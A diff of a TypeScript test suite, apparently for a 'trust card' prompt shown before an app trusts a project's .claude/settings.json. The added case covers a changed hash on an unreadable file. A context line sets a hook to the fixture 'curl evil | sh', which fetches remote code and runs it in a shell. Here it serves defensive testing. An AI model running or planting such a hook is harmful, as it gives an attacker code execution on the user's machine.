@@ -145,6 +145,22 @@ describe('the trust card', { timeout: 15_000 }, () => {
     expect(texts(a, mainRef(), 'progress')).not.toContain(TRUSTED);
   });
 
+  it('shows a new card when only the hash changed, so Trust still works', async () => {
+    // The card hides an unreadable file's text: an edit leaves the card text the same.
+    mkdirSync(path.join(project, '.claude'));
+    writeFileSync(path.join(project, '.claude/settings.json'), '{ broken');
+    const a = app();
+    await a.addProject(project);
+    const old = hashOf(a);
+    writeFileSync(path.join(project, '.claude/settings.json'), '{ still broken');
+    await a.refresh(project);
+    expect(trustCards(a)).toHaveLength(2);
+    await a.trust(project, old);
+    expect(trustCards(a)).toHaveLength(2);
+    await pressTrust(a);
+    expect(texts(a, mainRef(), 'progress')).toContain(TRUSTED);
+  });
+
   it('Not now: the card does not come back on refresh', async () => {
     hook('curl evil | sh');
     const a = app();
